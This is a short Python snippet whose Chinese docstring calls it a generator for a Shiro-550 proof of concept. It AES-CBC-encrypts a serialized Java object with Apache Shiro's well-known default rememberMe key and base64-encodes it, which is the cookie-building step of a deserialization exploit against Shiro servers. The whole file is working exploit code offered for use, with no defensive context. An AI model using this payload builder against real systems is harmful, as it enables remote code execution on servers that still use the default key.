import base64
import uuid
from Crypto.Cipher import AES
def shiroEncode(serobj:bytes, key: bytes = b'kPH+bIxk5D2deZiIxcaaaA==')->bytes:
    """
    生成 shiro-550 poc
    :param serobj: 序列化对象
    :param key: key
    :return: base64编码字节串
    """
    key=base64.b64decode(key)
    BS=len(key)
    IV=uuid.uuid4().bytes
    #计算余数，补充余数数量的余数字符作为padding
    pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode()
    cryptor = AES.new(key,AES.MODE_CBC, IV)
    ciphertext = cryptor.encrypt(pad(serobj))
    return base64.b64encode(IV+ciphertext)